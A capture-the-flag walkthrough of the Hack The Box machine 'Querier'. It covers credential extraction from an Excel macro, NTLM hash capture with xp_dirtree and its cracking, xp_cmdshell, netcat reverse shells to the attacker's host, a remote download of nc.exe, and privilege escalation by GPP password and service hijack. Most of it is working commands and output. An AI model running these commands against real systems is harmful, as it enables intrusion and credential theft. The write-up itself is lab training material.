# Querier

URL: https://app.hackthebox.com/machines/Querier

Level: Medium

Date 14 May 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)
- [Privesc2](#privesc2)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Fri May 14 19:48:10 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.125
Nmap scan report for 10.10.10.125
Host is up (0.045s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

# Nmap done at Fri May 14 19:48:58 2021 -- 1 IP address (1 host up) scanned in 48.43 seconds
```

```
# Nmap 7.91 scan initiated Fri May 14 19:50:41 2021 as: nmap -T4 -p135,139,445,1433,5985,47001 -A -oN 02_nmap_withA.txt 10.10.10.125
Nmap scan report for 10.10.10.125
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-05-14T17:55:51
|_Not valid after:  2051-05-14T17:55:51
|_ssl-date: 2021-05-14T17:59:20+00:00; +7m51s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7m51s, deviation: 0s, median: 7m51s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-14T17:59:17
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   44.37 ms 10.10.14.1
2   44.55 ms 10.10.10.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 14 19:51:29 2021 -- 1 IP address (1 host up) scanned in 49.24 seconds
```

We focus on samba service:

```
root@kali:/opt/htb/Querier# smbclient -L 10.10.10.125
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




root@kali:/opt/htb/Querier# smbclient  \\\\10.10.10.125\\Reports
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

                6469119 blocks of size 4096. 1607699 blocks available
smb: \>
```

We extract xlsm file and we found some credential:

```
root@kali:/opt/htb/Querier/currency/xl# strings  vbaProject.bin
 macro to pull data for client volume reports
n.Conn]
Open
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
 further testing required
```

So far, we got MSSQL password:

```
reporting
PcwTWTHRwryjc$c6
```

We use `mssqlclient.py` and we gain access:

```
root@kali:/opt/htb/Querier# mssqlclient.py   QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

Now, we need to obtain NTLM hash.

So, we spawn a fake SMB server on our machine:

```
root@kali:/opt/htb/Querier# smbserver.py -smb2support share share/
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

On target SQL server, we use this command:

```
root@kali:/opt/htb/Querier# mssqlclient.py   QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> exec xp_dirtree '\\10.10.14.28\share\',1,1
subdirectory                                                                                                                                                                                                                                                            depth          file

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   -----------

SQL>

```	

And we get something back:

```
root@kali:/opt/htb/Querier# smbserver.py -smb2support share share/
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49675)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:4141414141414141:e6514f3d4a8074c824a6cb86cb73797d:010100000000000000f113920a49d701254562976add37e7000000000100100046004100610044004e00510043007900020010006f00730057004a004c004a00550059000300100046004100610044004e00510043007900040010006f00730057004a004c004a00550059000700080000f113920a49d701060004000200000008003000300000000000000000000000003000002b6cddc5fea98e6ddb52b5bfbda9c2c4cdaba5ea7cabaf94e0d0a154eea66ccb0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003800000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User QUERIER\ authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.10.125,49675)
[*] Remaining connections []
```

This is our hash:

```
mssql-svc::QUERIER:4141414141414141:e6514f3d4a8074c824a6cb86cb73797d:010100000000000000f113920a49d701254562976add37e7000000000100100046004100610044004e00510043007900020010006f00730057004a004c004a00550059000300100046004100610044004e00510043007900040010006f00730057004a004c004a00550059000700080000f113920a49d701060004000200000008003000300000000000000000000000003000002b6cddc5fea98e6ddb52b5bfbda9c2c4cdaba5ea7cabaf94e0d0a154eea66ccb0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003800000000000000000000000000
```

Time to crack with `hashcat`:

```
root@kali:/opt/htb/Querier# hashcat -m 5600 13_mssql-svc-hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2889/2953 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: NetNTLMv2
Hash.Target......: MSSQL-SVC::QUERIER:4141414141414141:e6514f3d4a8074c...000000
Time.Started.....: Fri May 14 23:49:45 2021 (17 secs)
Time.Estimated...: Fri May 14 23:50:30 2021 (28 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   317.1 kH/s (2.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 5306368/14344385 (36.99%)
Rejected.........: 0/5306368 (0.00%)
Restore.Point....: 5306368/14344385 (36.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: murderouse -> muppetme

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: NetNTLMv2
Hash.Target......: MSSQL-SVC::QUERIER:4141414141414141:e6514f3d4a8074c...000000
Time.Started.....: Fri May 14 23:49:45 2021 (20 secs)
Time.Estimated...: Fri May 14 23:50:30 2021 (25 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   318.2 kH/s (2.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 6337536/14344385 (44.18%)
Rejected.........: 0/6337536 (0.00%)
Restore.Point....: 6337536/14344385 (44.18%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: larry0404 -> larkin$

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: NetNTLMv2
Hash.Target......: MSSQL-SVC::QUERIER:4141414141414141:e6514f3d4a8074c...000000
Time.Started.....: Fri May 14 23:49:45 2021 (21 secs)
Time.Estimated...: Fri May 14 23:50:30 2021 (24 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   317.4 kH/s (2.59ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 6577152/14344385 (45.85%)
Rejected.........: 0/6577152 (0.00%)
Restore.Point....: 6577152/14344385 (45.85%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: killed0205 -> killaduke29

MSSQL-SVC::QUERIER:4141414141414141:e6514f3d4a8074c824a6cb86cb73797d:010100000000000000f113920a49d701254562976add37e7000000000100100046004100610044004e00510043007900020010006f00730057004a004c004a00550059000300100046004100610044004e00510043007900040010006f00730057004a004c004a00550059000700080000f113920a49d701060004000200000008003000300000000000000000000000003000002b6cddc5fea98e6ddb52b5bfbda9c2c4cdaba5ea7cabaf94e0d0a154eea66ccb0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003800000000000000000000000000:corporate568
```

Now we can access with `MSSQL-SVC` privilege:

```
root@kali:/opt/htb/Querier# mssqlclient.py   QUERIER/MSSQL-SVC:'corporate568'@10.10.10.125 -windows-auth
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

# User-flag

Now we can grab user flag:

```
SQL> xp_cmdshell dir c:\
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is FE98-F373

NULL

 Directory of c:\

NULL

09/15/2018  08:19 AM    <DIR>          PerfLogs

01/29/2019  12:55 AM    <DIR>          Program Files

01/29/2019  01:02 AM    <DIR>          Program Files (x86)

01/29/2019  12:23 AM    <DIR>          Reports

01/29/2019  12:41 AM    <DIR>          Users

01/29/2019  12:10 AM    <DIR>          Windows

               0 File(s)              0 bytes

               6 Dir(s)   6,536,212,480 bytes free

NULL

SQL> xp_cmdshell dir c:\users\Luis\Desktop
output

--------------------------------------------------------------------------------

The system cannot find the file specified.

NULL

SQL> xp_cmdshell dir c:\users\
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is FE98-F373

NULL

 Directory of c:\users

NULL

01/29/2019  12:41 AM    <DIR>          .

01/29/2019  12:41 AM    <DIR>          ..

01/28/2019  11:17 PM    <DIR>          Administrator

01/29/2019  12:42 AM    <DIR>          mssql-svc

01/28/2019  11:17 PM    <DIR>          Public

               0 File(s)              0 bytes

               5 Dir(s)   6,536,212,480 bytes free

NULL

SQL> xp_cmdshell dir c:\users\mssql-svc\Desktop
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is FE98-F373

NULL

 Directory of c:\users\mssql-svc\Desktop

NULL

01/29/2019  12:42 AM    <DIR>          .

01/29/2019  12:42 AM    <DIR>          ..

01/28/2019  01:08 AM                33 user.txt

               1 File(s)             33 bytes

               2 Dir(s)   6,536,187,904 bytes free

NULL

SQL> xp_cmdshell type c:\users\mssql-svc\Desktop\user.txt
output

--------------------------------------------------------------------------------

c37b41bb669da345bb14de50faab3c16

NULL

SQL>
```

# Privesc

First, we try to obtain a better shell.

We need `nc.exe` on target, so we transfer it through our python webserver:

```
root@kali:/opt/htb/Querier# cp /root/nc.exe .
root@kali:/opt/htb/Querier# #python -m SimpleHTTPServer 80
```

```
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.125 - - [15/May/2021 00:13:53] "GET /nc.exe HTTP/1.1" 200 -


SQL> xp_cmdshell powershell -c Invoke-WebRequest "http://10.10.14.28/nc.exe" -OutFile "C:\Reports\nc.exe"
output

--------------------------------------------------------------------------------

NULL
```

```
SQL> xp_cmdshell c:\reports\nc.exe 10.10.14.28 4444 -e cmd.exe
```

```
root@kali:/opt/htb/Querier# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.125] 49677
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>

C:\Windows\system32>

C:\Windows\system32>whoami
whoami
querier\mssql-svc

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We spawn an anonymous FTP server and we transer `PowerUp`:

```
root@kali:/opt/htb/Querier# python3 -m pyftpdlib -p 21
[I 2021-05-15 00:21:18] >>> starting FTP server on 0.0.0.0:21, pid=17727 <<<
[I 2021-05-15 00:21:18] concurrency model: async
[I 2021-05-15 00:21:18] masquerade (NAT) address: None
[I 2021-05-15 00:21:18] passive ports: None
[I 2021-05-15 00:21:25] 10.10.10.125:49678-[] FTP session opened (connect)
[I 2021-05-15 00:21:32] 10.10.10.125:49678-[anonymous] USER 'anonymous' logged in.
[I 2021-05-15 00:22:02] 10.10.10.125:49678-[anonymous] RETR /opt/htb/Querier/PowerUp.ps1 completed=1 bytes=605569 seconds=0.274
^C[I 2021-05-15 00:22:29] received interrupt signal
[I 2021-05-15 00:22:29] >>> shutting down FTP server (2 active socket fds) <<<
[I 2021-05-15 00:22:29] 10.10.10.125:49678-[anonymous] FTP session closed (disconnect).



c:\Reports>ftp 10.10.14.28
ftp 10.10.14.28
Log in with USER and PASS first.
User (10.10.14.28:(none)): anonymous
Password: asd@asd.it


hash
Hash mark printing On  ftp: (2048 bytes/hash mark) .
ascii



get PowerUp.ps1
#######################################################################################################################################################################################################################################################################################################
```

We run it and we found something interesting:

```
c:\Reports>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Reports> . .\PowerUp.ps1
. .\PowerUp.ps1
PS C:\Reports> Invoke-AllChecks
Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1864
ProcessId   : 1236
Name        : 1236
Check       : Process Token Privileges


ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files



PS C:\Reports>
PS C:\Reports>
```

Now we can access with `psexec` with Administrator credentials and grab root flag:

```
root@kali:/opt/htb/Querier# /opt/impacket/examples/psexec.py Administrator:'MyUn                                                                                                              clesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corpo                                                                                                              ration

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file gUYaeckV.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service OVMU on 10.10.10.125.....
[*] Starting service OVMU.....
[!] Press help for extra shell commands                                                                                                                                                      Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami                                                                                                                                                                   nt authority\system

C:\Windows\system32>cd c:\users\administrator\desktop
c:\Users\Administrator\Desktop>type root.txt                                                                                                                                                 b19c3794f786a1fdcf205f81497c3592

c:\Users\Administrator\Desktop>
```

# Privesc2

Unquoted service path:

```
c:\Reports>sc query UsoSvc
sc query UsoSvc

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Reports>sc config UsoSvc binpath= "c:\reports\nc.exe 10.10.14.28 5555 -e cmd.exe"
sc config UsoSvc binpath= "c:\reports\nc.exe 10.10.14.28 5555 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS

c:\Reports>net stop UsoSvc
net stop UsoSvc
The Update Orchestrator Service service is stopping.
The Update Orchestrator Service service was stopped successfully.


c:\Reports>net start UsoSvc
net start UsoSvc


root@kali:/opt/htb/Querier# nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.125] 49681
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
```


